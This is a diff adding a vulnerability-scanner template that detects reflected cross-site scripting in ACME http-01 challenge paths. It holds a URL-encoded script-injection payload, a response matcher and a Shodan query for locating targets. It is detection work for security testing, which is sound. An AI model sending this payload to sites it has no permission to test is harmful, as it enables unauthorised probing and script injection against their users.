@@ -1,0 +1,27 @@
+id: acme-challenge-path-xss
+
+info:
+  name: ACME Challenge Path - Reflected Cross-Site Scripting
+  author: pussycat0x
+  severity: low
+  description: |
+    Detects XSS vulnerabilities in ACME http-01 challenge implementations where hosting providers reflect the challenge key from the URL without proper sanitization
+  reference:
+    - https://labs.detectify.com/security-guidance/xss-using-quirky-implementations-of-acme-http-01/
+    - https://www.acunetix.com/vulnerabilities/web/cross-site-scripting-in-http-01-acme-challenge-implementation/
+  metadata:
+    shodan-query: html:"acme-challenge"
+  tags: xss,acme,misconfig,vuln
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/.well-known/acme-challenge/%3C%3fxml%20version=%221.0%22%3f%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert%28document.domain%26%23x29%3B%3C/x:script%3E"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "<script>alert(document.domain)</script>")'
+        condition: and
+# digest: 490a004630440220769248e335a93ac21bcc4633efc975f12a8b9d3c9a4fbeaf1d4e17c0ac61b07002202d497596dd7b665813f76049b34124ea4fa9ab06372afc291ff805e0b4f3f3fb:922c64590222798bb761d5b6d8e72950
